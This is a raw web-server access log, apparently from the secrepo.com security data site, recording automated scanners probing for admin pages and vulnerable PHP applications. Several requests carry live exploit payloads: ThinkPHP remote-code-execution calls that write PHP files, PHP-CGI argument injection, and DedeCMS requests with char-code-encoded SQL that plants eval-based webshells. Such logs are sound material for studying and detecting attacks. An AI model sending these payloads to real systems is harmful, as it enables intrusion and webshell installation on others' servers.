3.138.175.227 - - [04/Dec/2023:01:42:14 -0800] "GET /plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\\\'%20or%20mid= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.43" 
35.187.132.44 - - [04/Dec/2023:01:42:13 -0800] "GET /Datasets%20Description/Network/?C=N HTTP/1.1" 200 746 "http://www.secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.44 - - [04/Dec/2023:01:42:13 -0800] "HEAD /yypdf.php HTTP/1.1" 404 309 "http://www.secrepo.com" "Mozilla/5.0 (Linux; Android 13; Pixel 4a (5G) Build/TQ2A.230505.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 GoogleApp/14.16.27.29.arm64 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.44 - - [04/Dec/2023:01:42:14 -0800] "HEAD /?luicode=10000011&lfid=1076032903573980&u=http://www.secrepo.com/ HTTP/1.1" 200 373 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.42 - - [04/Dec/2023:01:42:15 -0800] "HEAD /assets/admin/ HTTP/1.1" 404 286 "http://secrepo.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.44 - - [04/Dec/2023:01:42:13 -0800] "HEAD /Datasets%20Description/Network/dns.html HTTP/1.1" 200 395 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.44 - - [04/Dec/2023:01:42:14 -0800] "HEAD /?fbclid=IwAR1x2rlMRxfyjuRiCZOiKn2d9wY5aq7nLAoTPYy4MPzEAXqlVOPzrYCz1Gc HTTP/1.1" 200 373 "http://www.secrepo.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.43 - - [04/Dec/2023:01:42:14 -0800] "HEAD /?s=index/\\\\think\\\\template\\\\driver\\\\file/write&cacheFile=cxydq.php&content= HTTP/1.1" 200 373 "http://www.secrepo.com" "Mozilla/5.0 (Linux; Android 13; Pixel 4a (5G) Build/TQ2A.230505.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 GoogleApp/14.16.27.29.arm64 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.43 - - [04/Dec/2023:01:42:14 -0800] "GET /security.txt HTTP/1.1" 404 305 "http://secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.44 - - [04/Dec/2023:01:42:14 -0800] "HEAD /auth.log/auth.log.gz HTTP/1.1" 200 408 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
18.118.55.204 - - [04/Dec/2023:01:42:14 -0800] "GET /a/admin/ HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.43" 
35.187.132.44 - - [04/Dec/2023:01:42:15 -0800] "GET /a/admin/ HTTP/1.1" 404 305 "http://secrepo.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.43 - - [04/Dec/2023:01:42:15 -0800] "GET /Datasets%20Description/HTML_Bro_log_3/dhcp.html HTTP/1.1" 200 1717 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.44 - - [04/Dec/2023:01:42:14 -0800] "GET /user/admin/ HTTP/1.1" 404 305 "http://secrepo.com" "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/112.0 Firefox/112.0 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.42 - - [04/Dec/2023:01:42:14 -0800] "GET /glgvt.php HTTP/1.1" 404 305 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.43 - - [04/Dec/2023:01:42:14 -0800] "GET /Datasets%20Description/PE_malware/?C=M HTTP/1.1" 200 663 "http://www.secrepo.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.42 - - [04/Dec/2023:01:42:14 -0800] "GET /applet/admin/ HTTP/1.1" 404 305 "http://secrepo.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.43 - - [04/Dec/2023:01:42:14 -0800] "GET /arrow/admin/ HTTP/1.1" 404 305 "http://secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.42 - - [04/Dec/2023:01:42:14 -0800] "HEAD /Datasets%20Description/HTML_Bro_log_1 HTTP/1.1" 301 328 "http://www.secrepo.com" "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/112.0 Firefox/112.0 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.43 - - [04/Dec/2023:01:42:14 -0800] "HEAD /admin/ewebeditor/login_admin.asp HTTP/1.1" 404 286 "http://www.secrepo.com" "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/112.0 Firefox/112.0 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.44 - - [04/Dec/2023:01:42:15 -0800] "GET /admin HTTP/1.1" 404 305 "http://www.secrepo.com" "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/112.0 Firefox/112.0 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.44 - - [04/Dec/2023:01:42:14 -0800] "HEAD /index.PHP?m=vod-search HTTP/1.1" 404 286 "http://www.secrepo.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.44 - - [04/Dec/2023:01:42:15 -0800] "HEAD / HTTP/1.1" 200 373 "http://www.secrepo.com" "Mozilla/5.0 (Linux; Android 13; Pixel 4a (5G) Build/TQ2A.230505.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 GoogleApp/14.16.27.29.arm64 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.43 - - [04/Dec/2023:01:42:14 -0800] "GET /client/manage/ourphp_filebox.php?op=home&folder=./&validation=&code= HTTP/1.1" 404 305 "http://www.secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.43 - - [04/Dec/2023:01:42:15 -0800] "GET /fckeditor/editor/filemanager/upload/php/upload.php HTTP/1.1" 404 305 "http://www.secrepo.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.42 - - [04/Dec/2023:01:42:15 -0800] "GET /?spm=a2c6h.12873639.0.0.15406bf9u9CavF HTTP/1.1" 200 13163 "http://www.secrepo.com" "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/112.0 Firefox/112.0 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.43 - - [04/Dec/2023:01:42:15 -0800] "HEAD /uc_server/robots.txt HTTP/1.1" 404 309 "http://www.secrepo.com" "Mozilla/5.0 (Linux; Android 13; Pixel 4a (5G) Build/TQ2A.230505.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 GoogleApp/14.16.27.29.arm64 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.43 - - [04/Dec/2023:01:42:14 -0800] "HEAD /index.php?m=admin&c=index&a=login&pc_hash= HTTP/1.1" 404 286 "http://www.secrepo.com" "Mozilla/5.0 (Linux; Android 13; Pixel 4a (5G) Build/TQ2A.230505.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 GoogleApp/14.16.27.29.arm64 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
18.118.55.204 - - [04/Dec/2023:01:42:15 -0800] "GET /inc/md5.asp HTTP/1.1" 301 441 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.43" 
35.187.132.43 - - [04/Dec/2023:01:42:15 -0800] "GET /include/search.php?key= HTTP/1.1" 404 305 "http://www.secrepo.com" "Mozilla/5.0 (Linux; Android 13; Pixel 4a (5G) Build/TQ2A.230505.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 GoogleApp/14.16.27.29.arm64 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
3.138.175.227 - - [04/Dec/2023:01:42:14 -0800] "GET /app/app/ueditor/php/controller.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.43" 
35.187.132.44 - - [04/Dec/2023:01:42:15 -0800] "GET /db/admin/ HTTP/1.1" 404 305 "http://secrepo.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.42 - - [04/Dec/2023:01:42:15 -0800] "GET /yypdf.php HTTP/1.1" 404 305 "http://www.secrepo.com" "Mozilla/5.0 (Linux; Android 13; Pixel 4a (5G) Build/TQ2A.230505.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 GoogleApp/14.16.27.29.arm64 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.44 - - [04/Dec/2023:01:42:15 -0800] "GET /admin/Ueditor/net/controller.ashx HTTP/1.1" 404 305 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.44 - - [04/Dec/2023:01:42:15 -0800] "GET /e/tool/gbook/?bid=1 HTTP/1.1" 404 305 "http://www.secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.101 - - [04/Dec/2023:01:42:15 -0800] "HEAD /api/admin/ HTTP/1.1" 301 232 "http://secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.42 - - [04/Dec/2023:01:42:15 -0800] "GET /include/taglib/jr.lib.php HTTP/1.1" 404 305 "http://secrepo.com" "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/112.0 Firefox/112.0 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.44 - - [04/Dec/2023:01:42:15 -0800] "HEAD /include/common.inc.php HTTP/1.1" 404 286 "http://secrepo.com" "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/112.0 Firefox/112.0 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.44 - - [04/Dec/2023:01:42:15 -0800] "GET /Inc/md5.asp HTTP/1.1" 404 305 "http://secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.44 - - [04/Dec/2023:01:42:13 -0800] "HEAD /Datasets%20Description/HTML_Bro_log_1/?C=D HTTP/1.1" 200 257 "http://www.secrepo.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.100 - - [04/Dec/2023:01:42:15 -0800] "HEAD /aspadmin/admin/ HTTP/1.1" 301 237 "http://secrepo.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.42 - - [04/Dec/2023:01:42:15 -0800] "HEAD /inc/md5.asp HTTP/1.1" 404 286 "http://secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.43 - - [04/Dec/2023:01:42:14 -0800] "GET /honeypot/BSidesDFW HTTP/1.1" 404 328 "http://www.secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.44 - - [04/Dec/2023:01:42:12 -0800] "HEAD /plus/mytag_js.php?dopost=saveedit&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=57&arrs2[]=48&arrs2[]=44&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=39&arrs2[]=39&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=99&arrs2[]=109&arrs2[]=115&arrs2[]=32&arrs2[]=53&arrs2[]=46&arrs2[]=55&arrs2[]=32&arrs2[]=48&arrs2[]=100&arrs2[]=97&arrs2[]=121&arrs2[]=60&arrs2[]=98&arrs2[]=114&arrs2[]=62&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=44& HTTP/1.1" 404 309 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.42 - - [04/Dec/2023:01:42:13 -0800] "HEAD /auth.log/ HTTP/1.1" 200 280 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.44 - - [04/Dec/2023:01:42:14 -0800] "GET /include/calendar/calendar-cn.js HTTP/1.1" 404 328 "http://www.secrepo.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
3.138.175.227 - - [04/Dec/2023:01:42:14 -0800] "GET /?s=index/\\\\think\\\\template\\\\driver\\\\file/write&cacheFile=nrahu.php&content= HTTP/1.1" 200 13142 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.43" 
35.187.132.44 - - [04/Dec/2023:01:42:13 -0800] "HEAD /Datasets%20Description/PE_malware/ HTTP/1.1" 200 280 "http://www.secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.43 - - [04/Dec/2023:01:42:15 -0800] "HEAD /?-d%20allow_url_include=on%20-d%20auto_prepend_file=php://input HTTP/1.1" 418 191 "http://secrepo.com" "Mozilla/5.0 (Linux; Android 13; Pixel 4a (5G) Build/TQ2A.230505.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 GoogleApp/14.16.27.29.arm64 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.42 - - [04/Dec/2023:01:42:15 -0800] "GET /concon.asp HTTP/1.1" 404 305 "http://secrepo.com" "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/112.0 Firefox/112.0 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
18.118.55.204 - - [04/Dec/2023:01:42:15 -0800] "GET /?-d%20allow_url_include=on%20-d%20auto_prepend_file=php://input HTTP/1.1" 418 691 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.43" 
91.90.42.154 - - [04/Dec/2023:01:42:15 -0800] "GET /application/admin/ HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" 
35.187.132.44 - - [04/Dec/2023:01:42:15 -0800] "HEAD /plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=109&arrs2[]=111&arrs2[]=111&arrs2[]=110&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&ar HTTP/1.1" 418 191 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
3.138.175.227 - - [04/Dec/2023:01:42:14 -0800] "GET /account/admin/ HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.43" 
35.187.132.44 - - [04/Dec/2023:01:42:13 -0800] "GET /Datasets%20Description/PE_malware/?C=D HTTP/1.1" 200 663 "http://www.secrepo.com" "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/112.0 Firefox/112.0 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.43 - - [04/Dec/2023:01:42:14 -0800] "HEAD /self.logs/2016/?C=S HTTP/1.1" 200 280 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
3.138.175.227 - - [04/Dec/2023:01:42:14 -0800] "GET /Datasets%20Description/Network/smtp.html HTTP/1.1" 200 1593 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.43" 
35.187.132.44 - - [04/Dec/2023:01:42:15 -0800] "HEAD /Datasets%20Description/HTML_Bro_log_2/ HTTP/1.1" 200 257 "http://www.secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
35.187.132.42 - - [04/Dec/2023:01:42:15 -0800] "HEAD /self.logs/2015/?C=D HTTP/1.1" 200 257 "http://www.secrepo.com" "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/112.0 Firefox/112.0 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
3.143.242.243 - - [04/Dec/2023:01:42:15 -0800] "GET /action/admin/ HTTP/1.1" 301 445 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.43" 
35.187.132.43 - - [04/Dec/2023:01:42:14 -0800] "GET /?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=iyygj.php&vars[1][]= HTTP/1.1" 418 746 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
3.143.242.243 - - [04/Dec/2023:01:42:15 -0800] "GET /action/admin/ HTTP/1.1" 301 445 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.43" 
35.187.132.44 - - [04/Dec/2023:01:42:13 -0800] "GET /admin_login.asp HTTP/1.1" 404 328 "http://www.secrepo.com" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
18.118.55.204 - - [04/Dec/2023:01:42:14 -0800] "GET /?s=index/\\\\think\\\\template\\\\driver\\\\file/write&cacheFile=cxydq.php&content= HTTP/1.1" 200 13142 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.43" 
35.187.132.42 - - [04/Dec/2023:01:42:15 -0800] "GET /_whatsnew.html HTTP/1.1" 404 305 "http://www.secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)" 
